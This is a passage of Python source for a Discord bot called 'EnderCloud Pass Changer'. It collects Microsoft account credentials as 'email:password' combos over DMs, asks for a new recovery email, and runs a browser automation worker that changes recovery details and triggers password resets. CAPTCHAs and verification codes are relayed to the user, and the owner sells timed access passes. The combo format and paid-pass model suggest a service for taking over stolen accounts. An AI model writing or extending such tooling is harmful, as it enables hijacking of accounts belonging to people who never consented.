            self._handle_product_option_mail()
            self._perform_final_email_sequence()
            self.log_signal.emit("[BOT] Flow completed. Check reset link / recovery status.")
            
            time.sleep(5)
            if self.confirmation_callback:
                self.log_signal.emit("[BOT] Waiting for user confirmation (Link Received?)...")
                if not self.confirmation_callback():
                    self.log_signal.emit("[BOT] Use Another Account This Account Has a Problem")
            else:
                self.log_signal.emit("[BOT] Waiting 10 seconds before closing browser...")
                time.sleep(10)
        except Exception as e:
            self.log_signal.emit(f"[BOT] Error during flow: {e}")
            self.log_signal.emit("[BOT] Waiting 20 seconds before closing browser due to error...")
            time.sleep(20)

BOT_PREFIX = "e "

# In-memory pass store: user_id -> expiry datetime (UTC)
ALLOWED_USERS: dict[int, datetime] = {}

# Track which users currently have an active `v change` job running, so that
# a single user cannot start multiple overlapping sessions that would mix
# their CAPTCHA / recovery-code prompts.
ACTIVE_JOBS: set[int] = set()

intents = discord.Intents.default()
intents.message_content = True
bot = commands.Bot(command_prefix=BOT_PREFIX, intents=intents, help_command=None)


@bot.event
async def on_ready():
    print(f"Logged in as {bot.user} (ID: {bot.user.id})")
    print(f"Emoji Configuration Loaded: Lock={Emojis.LOCK}")

    print("--- Checking Emoji Accessibility ---")
    for attr_name in dir(Emojis):
        if attr_name.startswith("__"): continue
        emoji_str = getattr(Emojis, attr_name)
        if isinstance(emoji_str, str) and (emoji_str.startswith("<") and emoji_str.endswith(">")):
            match = re.search(r":(\d+)>", emoji_str)
            if match:
                emoji_id = int(match.group(1))
                found = bot.get_emoji(emoji_id)
                if not found:
                    print(f"[WARNING] Emoji '{attr_name}' (ID: {emoji_id}) not found in bot cache. It may not render.")
                else:
                    print(f"[OK] Emoji '{attr_name}' found: {found.name} in {found.guild.name}")
    print("--- Emoji Check Complete ---")

    await bot.change_presence(activity=discord.Game(name="e change"))


@bot.command(name="help")
async def help_cmd(ctx: commands.Context):
    """Show commands for the EnderCloud pass changer bot."""
    prefix = bot.command_prefix
    if isinstance(prefix, (list, tuple)):
        prefix = prefix[0] or "e "

    embed = discord.Embed(
        title=f"{Emojis.LOCK} **EnderCloud Pass Changer**",
        description=f"**Secure & Automated Microsoft Recovery**\n\n> **Prefix:** `{prefix}`\n> **System:** `Online` {Emojis.SUCCESS}",
        color=discord.Color.from_rgb(135, 206, 250),
    )
    if bot.user:
        embed.set_thumbnail(url=bot.user.display_avatar.url)

    embed.add_field(
        name=f"{Emojis.KEY} **Owner Access**",
        value=(
            f"> `{prefix}pass @user <time>`\n"
            f"> **Grant Access:** `1d`, `1h`, `30m`\n"
            f"> *Authorize users for temporary access.*"
        ),
        inline=False,
    )

    embed.add_field(
        name=f"{Emojis.LOADING} **Start Recovery**",
        value=(
            f"> `{prefix}change`\n"
            f"> **Initiate Process**\n"
            f"> *Begins the automated recovery workflow.*"
        ),
        inline=False,
    )

    embed.add_field(
        name=f"{Emojis.CHART} **Workflow Steps**",
        value=(
            f"{Emojis.NUM1} **Secure Entry**\nEnter credentials in DMs.\n\n"
            f"{Emojis.NUM2} **Automation**\nBot processes the account.\n\n"
            f"{Emojis.NUM3} **Verification**\nSolve CAPTCHA & Email Code."
        ),
        inline=False,
    )

    embed.set_footer(text="EnderCloud Automation • Authorized Personnel Only")

    await ctx.reply(embed=embed)


def _parse_duration(spec: str) -> timedelta | None:
    """Parse a simple duration string like '1d', '1h', '30m'."""
    try:
        num = int(spec[:-1])
        unit = spec[-1].lower()
    except Exception:
        return None

    if unit == "d":
        return timedelta(days=num)
    if unit == "h":
        return timedelta(hours=num)
    if unit == "m":
        return timedelta(minutes=num)
    return None


@bot.command(name="headless")
async def headless_cmd(ctx: commands.Context, state: str):
    """Toggle headless mode: e headless on/off"""
    if ctx.author.id != owner_id:
        return await ctx.reply("Only the bot owner can use this command.")

    global HEADLESS_MODE
    state = state.lower()
    if state in ["on", "true", "enable", "yes"]:
        HEADLESS_MODE = True
        await ctx.reply("Headless mode ENABLED (Browser UI hidden).")
    elif state in ["off", "false", "disable", "no"]:
        HEADLESS_MODE = False
        await ctx.reply("Headless mode DISABLED (Browser UI visible).")
    else:
        await ctx.reply("Usage: `e headless on` or `e headless off`")

@bot.command(name="pass")
async def pass_cmd(ctx: commands.Context, member: discord.Member, duration: str):
    """Grant temporary access to use the bot: e pass @user 1d/1h/30m"""
    # Only allow the configured owner ID to use this command.
    if ctx.author.id != owner_id:
        return await ctx.reply("Only the bot owner can use this command.")

    td = _parse_duration(duration)
    if not td:
        return await ctx.reply("Invalid duration. Use formats like 1d, 1h, 30m.")

    expires_at = datetime.utcnow() + td
    ALLOWED_USERS[member.id] = expires_at

    try:
        embed = discord.Embed(
            title="Pass Granted",
            description=(
                f"{member.mention} can use `e change` until ``{expires_at.isoformat(timespec='minutes')}Z``."
            ),
            color=discord.Color.green(),
        )
        await ctx.reply(embed=embed)
    except Exception:
        await ctx.reply(
            f"Pass granted to {member.mention} until {expires_at.isoformat(timespec='minutes')}Z."
        )


@pass_cmd.error
async def pass_cmd_error(ctx: commands.Context, error: commands.CommandError):
    if isinstance(error, commands.MissingPermissions):
        await ctx.reply("You need administrator permissions to use this command.")
    else:
        await ctx.reply(f"Error: {error}")


@bot.command(name="change")
async def change_cmd(ctx: commands.Context):
    dest = ctx.author if not isinstance(ctx.channel, discord.DMChannel) else ctx

    # Only allow users with a valid pass, except the owner who always has access.
    now_utc = datetime.utcnow()
    expiry = ALLOWED_USERS.get(ctx.author.id)
    if ctx.author.id != owner_id and (not expiry or expiry <= now_utc):
        await ctx.reply(
            "You do not have a valid pass to use this command. "
            "Ask an admin to run `e pass @you 1d` or similar."
        )
        return

    # Prevent a single user from running multiple overlapping sessions which
    # could cause their CAPTCHA / email-code prompts to get mixed.
    if ctx.author.id in ACTIVE_JOBS:
        await ctx.reply(
            "You already have an active session running. Please wait for it "
            "to finish before starting another."
        )
        return

    ACTIVE_JOBS.add(ctx.author.id)

    async def send(msg: str):
        try:
            await dest.send(msg)
        except Exception:
            pass

    async def send_embed(title: str, description: str, color: discord.Color):
        """Send a simple rich embed status message to the user."""
        try:
            embed = discord.Embed(title=title, description=description, color=color)
            await dest.send(embed=embed)
        except Exception:
            # Fallback to plain text if embeds fail
            await send(f"{title}: {description}")

    await send_embed(
        f"{Emojis.WARNING} Critical CAPTCHA Instructions",
        "**READ CAREFULLY BEFORE STARTING!**\n\n"
        f"{Emojis.SEARCH} **Wait for CAPTCHA:** The bot will send a screenshot.\n"
        f"{Emojis.EDIT} **Solve Accurately:** Incorrect answers may fail the process.\n"
        f"{Emojis.CHAT} **Stay in DMs:** Do not close or leave Discord.\n"
        f"{Emojis.LIGHTNING} **Respond Quickly:** You have limited time per prompt.\n\n"
        "*Failure to follow these can result in account lockout.*",
        discord.Color.red(),
    )

    await send_embed(
        f"{Emojis.LOCK} Credentials Required",
        f"Please send the account combo in the format:\n`email:password`\n\n{Emojis.TIMER} You have **60 seconds**.",
        discord.Color.gold()
    )

    def _check(m: discord.Message) -> bool:
        return m.author.id == ctx.author.id and isinstance(m.channel, discord.DMChannel)

    try:
        combo_msg = await bot.wait_for("message", timeout=60.0, check=_check)
    except asyncio.TimeoutError:
        # Clear active flag so the user can try again after a timeout.
        ACTIVE_JOBS.discard(ctx.author.id)
        await send_embed(f"{Emojis.CLOCK} Timeout", "You took too long to respond. Please start over.", discord.Color.red())
        return

    combo = combo_msg.content.strip()
    if ":" not in combo:
        # Clear active flag on invalid input so the user can immediately retry.
        ACTIVE_JOBS.discard(ctx.author.id)
        await send_embed(f"{Emojis.ERROR} Invalid Format", "Please use the format `email:password`.", discord.Color.red())
        return

    email, password = combo.split(":", 1)
    email = email.strip()
    password = password.strip()

    if not email or not password:
        # Clear active flag on invalid input so the user can immediately retry.
        ACTIVE_JOBS.discard(ctx.author.id)
        await send_embed(f"{Emojis.ERROR} Invalid Data", "Email or password cannot be empty.", discord.Color.red())
        return

    await send_embed(
        f"{Emojis.EMAIL} Recovery Email Required",
        f"Please send the **recovery email address** you want to use.\n\n{Emojis.TIMER} You have **60 seconds**.",
        discord.Color.gold()
    )

    try:
        rec_msg = await bot.wait_for("message", timeout=60.0, check=_check)
    except asyncio.TimeoutError:
        # Clear active flag so the user can start a new session after timeout.
        ACTIVE_JOBS.discard(ctx.author.id)
        await send_embed(f"{Emojis.CLOCK} Timeout", "You took too long to send the recovery email.", discord.Color.red())
        return

    recovery_email = rec_msg.content.strip()

    await send_embed(
        f"{Emojis.LOADING} Processing Account",
        f"{Emojis.SEARCH} Scraping account details and initializing recovery flow...\n"
        f"{Emojis.HOURGLASS} This process may take several minutes. Please wait.\n\n"
        "*Do not interact with the browser manually.*",
        discord.Color.blue(),
    )

    loop = asyncio.get_running_loop()

    # Single auto-updating status embed that shows the current step and a few
    # recent important log lines. This avoids DM spam while still giving the
    # user a live view of what is happening.
    status_message: discord.Message | None = None
    current_step: str = "Starting…"
    current_progress: int = 0
    status_lines: list[str] = []

    def _get_gradient_color(progress: int) -> discord.Color:
        """Interpolates color from Purple to Light Blue based on progress %."""
        # Start: Purple (140, 0, 255) -> End: Light Blue (135, 206, 250)
        start_rgb = (140, 0, 255)
        end_rgb = (135, 206, 250)
        
        ratio = max(0.0, min(1.0, progress / 100.0))
        
        r = int(start_rgb[0] + (end_rgb[0] - start_rgb[0]) * ratio)
        g = int(start_rgb[1] + (end_rgb[1] - start_rgb[1]) * ratio)
        b = int(start_rgb[2] + (end_rgb[2] - start_rgb[2]) * ratio)
        
        return discord.Color.from_rgb(r, g, b)

    def _build_status_embed() -> discord.Embed:
        # Create visual progress bar
        filled = int(current_progress / 100 * 15)
        bar = "█" * filled + "░" * (15 - filled)
        desc_lines = [f"**{Emojis.PIN} Current Step:** {current_step}", f"**{Emojis.CHART} Progress:** `{bar}` {current_progress}%"]
        if status_lines:
            desc_lines.append("")
            desc_lines.append(f"**{Emojis.SIREN} Recent Events:**")
            desc_lines.extend(status_lines[-5:])
        
        embed = discord.Embed(
            title=f"{Emojis.LOADING} Recovery Progress",
            description="\n".join(desc_lines),
            color=_get_gradient_color(current_progress),
        )
        embed.set_footer(text="Stay patient - automation in progress.")
        return embed

    async def _refresh_status_message():
        nonlocal status_message
        try:
            embed = _build_status_embed()
            if status_message is None:
                status_message = await dest.send(embed=embed)
            else:
                await status_message.edit(embed=embed)
        except Exception:
            # If updating the status message fails, ignore so the main flow
            # can continue.
            pass

    async def _update_status(line: str):
        nonlocal status_lines
        status_lines.append(line)
        # Only keep the last few lines so the message does not grow forever.
        status_lines = status_lines[-10:]
        await _refresh_status_message()

    async def _update_progress(percent: int, message: str):
        nonlocal current_step, current_progress
        current_step = message
        current_progress = percent
        await _refresh_status_message()

    async def _log_cb(msg: str):
        """Forward only important [BOT] logs (errors / stuck states) to the user.

        Normal progress logs stay internal to avoid DM spam.
        """
        if "[BOT]" not in msg:
            return

        # Special handling for storage errors to ensure visibility
        if "storage is full" in msg.lower() or "cant send outlook message" in msg.lower() or "daily limit" in msg.lower():
            await send_embed(f"{Emojis.WARNING} Outlook Alert", msg, discord.Color.orange())

        # Only surface logs that clearly indicate something went wrong or
        # that a CAPTCHA was incorrect or the flow appears stuck.
        lower = msg.lower()
        important_keywords = [
            "error",
            "failed",
            "captcha appears to be incorrect",
            "stuck",
            "problem",
            "storage is full",
            "cant send outlook message",
            "daily limit",
        ]
        if any(k in lower for k in important_keywords):
            await _update_status(msg)

    async def _send_captcha(image_bytes: bytes):
        """Send CAPTCHA image to the user as a DM attachment.

        For now this is informational only – you still need to solve the
        CAPTCHA in the browser, but you get a clear screenshot in Discord.
        """
        try:
            file = discord.File(io.BytesIO(image_bytes), filename="captcha.png")
            await send_embed(
                f"{Emojis.SEARCH} CAPTCHA Challenge",
                "**Solve the CAPTCHA in the attached image.**\n\n"
                "**Steps:**\n"
                f"{Emojis.EYES} View the image below.\n"
                f"{Emojis.KEYBOARD} Type the exact characters (case-sensitive).\n"
                f"{Emojis.CLOCK} Respond within 5 minutes.\n\n"
                "*Incorrect solves may require restarting.*",
                discord.Color.green(),
            )
            await dest.send(file=file)
        except Exception:
            # If sending fails, ignore so the main flow can continue.
            return

    async def _ask_value(prompt: str, timeout: float) -> str:
        """Ask the user for a value in DM and wait for a reply."""
        await send_embed(f"{Emojis.QUESTION} Input Required", prompt, discord.Color.orange())
        try:
            msg = await bot.wait_for("message", timeout=timeout, check=_check)
            return msg.content.strip()
        except asyncio.TimeoutError:
            await send_embed(f"{Emojis.CLOCK} Timeout", "Timed out waiting for your reply.", discord.Color.red())
            return ""

    class ConfirmationView(discord.ui.View):
        def __init__(self):
            super().__init__(timeout=600)
            self.result = None

        @discord.ui.button(label="Link Received", style=discord.ButtonStyle.green, emoji=Emojis.SUCCESS)
        async def received(self, interaction: discord.Interaction, button: discord.ui.Button):
            self.result = True
            await interaction.response.send_message(f"{Emojis.SUCCESS} Confirmed. Closing browser...", ephemeral=True)
            self.stop()

        @discord.ui.button(label="Link Not Received", style=discord.ButtonStyle.red, emoji=Emojis.ERROR)
        async def not_received(self, interaction: discord.Interaction, button: discord.ui.Button):
            self.result = False
            await interaction.response.send_message(f"{Emojis.ERROR} Marked as failed.", ephemeral=True)
            self.stop()

    def _worker():
        worker = ScraperWorker(email, password, headless=HEADLESS_MODE)

        def _forward_log(message: str):
            asyncio.run_coroutine_threadsafe(_log_cb(message), loop)

        def _forward_captcha(image_bytes: bytes):
            asyncio.run_coroutine_threadsafe(_send_captcha(image_bytes), loop)

        def _forward_progress(percent: int, message: str):
            asyncio.run_coroutine_threadsafe(
                _update_progress(percent, message),
                loop,
            )

        def _solve_captcha_sync(prompt: str) -> str:
            future = asyncio.run_coroutine_threadsafe(
                _ask_value(prompt, 300.0), loop
            )
            try:
                return future.result()
            except Exception:
                return ""

        def _solve_code_sync(prompt: str) -> str:
            future = asyncio.run_coroutine_threadsafe(
                _ask_value(prompt, 600.0), loop
            )
            try:
                return future.result()
            except Exception:
                return ""

        def _ask_confirmation_sync() -> bool:
            async def _ask():
                view = ConfirmationView()
                await dest.send("🛑 **Action Required:** Did you receive the password reset link?", view=view)
                await view.wait()
                return view.result if view.result is not None else True

            future = asyncio.run_coroutine_threadsafe(_ask(), loop)
            try:
                return future.result()
            except Exception:
                return True

        worker.log_signal.connect(_forward_log)
        try:
            worker.progress_update_signal.connect(_forward_progress)
        except Exception:
            # If wiring the progress signal fails, continue without live progress.
            pass

        try:
            worker.captcha_image_signal.connect(_forward_captcha)
        except Exception:
            pass
        # Provide synchronous solvers that talk to the Discord user via DM.
        worker.captcha_solver = _solve_captcha_sync
        worker.code_solver = _solve_code_sync
        worker.confirmation_callback = _ask_confirmation_sync
        try:
            worker.run_for_discord(alt_email=recovery_email)
        finally:
            worker.close_browser()

    try:
        await loop.run_in_executor(None, _worker)
        await send_embed(
            f"{Emojis.SUCCESS} Recovery Complete",
            f"{Emojis.PARTY} The automated recovery process has finished.\n\n"
            "**Next Steps:**\n"
            f"{Emojis.LINK} Check your email for reset links.\n"
            f"{Emojis.LOCK} Verify if the password change succeeded.\n"
            f"{Emojis.PHONE} Contact support if issues persist.\n\n"
            "*Thank you for using EnderCloud Pass Changer.*",
discord.Color.green(),
        )
    except Exception as e:
        # If the bot gets stuck or crashes inside the worker, surface that here.
        await send_embed(
            f"{Emojis.ERROR} Recovery Failed",
            f"{Emojis.BAN} The automation encountered an error and stopped.\n\n"
            "**Error Details:**\n"
            f"```{e}```\n\n"
            "**Suggestions:**\n"
            f"{Emojis.LOADING} Try again with correct details.\n"
            f"{Emojis.PHONE} Check account status manually.\n"
            f"{Emojis.SOS} Contact the bot owner for support.",
            discord.Color.red(),
        )
    finally:
        # Always clear the active-job flag for this user so they can start a
        # new session later, even if an error occurred.
        ACTIVE_JOBS.discard(ctx.author.id)

@bot.command(name="testemojis")
async def test_emojis_cmd(ctx: commands.Context):
    """Debug command to check if emojis are rendering correctly."""
    lines = [
        f"**Emoji Configuration Check**",
        f"Lock: {Emojis.LOCK} (Raw: `{Emojis.LOCK}`)",
        f"Key: {Emojis.KEY} (Raw: `{Emojis.KEY}`)",
        f"Loading: {Emojis.LOADING} (Raw: `{Emojis.LOADING}`)",
        f"Success: {Emojis.SUCCESS} (Raw: `{Emojis.SUCCESS}`)",
        f"Error: {Emojis.ERROR} (Raw: `{Emojis.ERROR}`)",
    ]

    lines.append("\n**Emoji Access Check:**")
    
    if ctx.guild:
        perms = ctx.channel.permissions_for(ctx.guild.me)
        if perms.use_external_emojis:
            lines.append("✅ Bot has 'Use External Emojis' permission.")
        else:
            lines.append("❌ Bot MISSING 'Use External Emojis' permission. Enable it in Server Settings -> Roles.")

    # Check if bot can see these emojis
    for name, emoji_str in [("LOCK", Emojis.LOCK), ("KEY", Emojis.KEY), ("LOADING", Emojis.LOADING), ("NUM1", Emojis.NUM1)]:
        # Extract ID from string like <a:name:123456>
        match = re.search(r":(\d+)>", emoji_str)
        if match:
            eid = int(match.group(1))
            found = bot.get_emoji(eid)
            if found:
                lines.append(f"✅ Bot can see {name} in server: `{found.guild.name}`")
            else:
                lines.append(f"❌ Bot CANNOT see {name} (ID: `{eid}`). Is the bot in the server where this emoji is uploaded?")
        else:
            lines.append(f"ℹ️ {name} is not a custom emoji ID.")

    lines.append("\n**Servers the Bot is In:**")
    for guild in bot.guilds:
        lines.append(f"• {guild.name}")
    lines.append("\n*If the server with your emojis is not in this list, you must invite the bot to it.*")

    await ctx.reply("\n".join(lines))

if __name__ == "__main__":
    print(f"Starting bot with token: {'*' * 10 + token[-5:] if token else 'No token'}")
    try:
        bot.run(token)
    except Exception as e:
        print(f"Error starting bot: {e}")
        raise
